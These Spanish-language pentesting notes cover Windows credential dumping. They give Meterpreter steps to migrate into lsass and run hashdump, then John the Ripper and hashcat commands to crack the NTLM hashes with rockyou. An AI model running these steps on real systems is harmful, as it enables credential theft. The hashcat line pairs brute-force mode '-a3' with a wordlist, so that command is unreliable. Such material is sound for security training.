# Escalación de privilegios en Windows

Tags: #Windows #PrivEsc #Meterpreter #DumpCrackHashes #John #HashCat 

## Crackear y Dumpear Hashes Windows 

```bash 
# El sistema de Windows almacena los hashes de las cuentas de usuario localmente en la SAM (Security Accounts Manager)
# Autenticacion y la verificacion de las credenciales de los usuarios son facilitadas por el LSA (Local Security Authority)
# Las versiones arriba de Windows Server 2003 utilizan dos diferentes tipos de hashes: LM, NTLM
# Windows Vista desactiva los hashes LM y utiliza los hashes NTLM
# En versiones modernas de Windows, la base de datos SAM es encryptada con un syskey 

# Nota: Se requieren permisos Elevados/Administradot para acceder e interactuar con los procesos LSASS
```

```bash 
# Comandos con Meterpreter (Debemos de ser Administrator)

❯ pgrep lsass             # Para ver el ID del proceso lsass
❯ migrate <ID>            # Colocamos el ID del proceso lsass
❯ hashdump                # Dumpea los hashes de los usuarios
```

```bash 
# Comandos Windows 
❯ net user                # Ver los usuarios que existen  
```

```bash 
# Una vez que tengamos los hashes, lo que hacemos es copiarlos en un archivo .txt en nuestra maquina de atacante para despues romperlos con la tool 'John the Ripper'

❯ john --format=NT hashes.txt      # John the ripper nos ayuda a crackear los hashes con un diccionario, si no agregas uno, el coloca el de default 
❯ john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt


❯ hashcat --help                   # Miramos la documentacion de Hashcat 
❯ hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
	# m = 1000 = Modo de hash para NTLM
	# a3 = Modo de ataque (3 = Brute-force)
```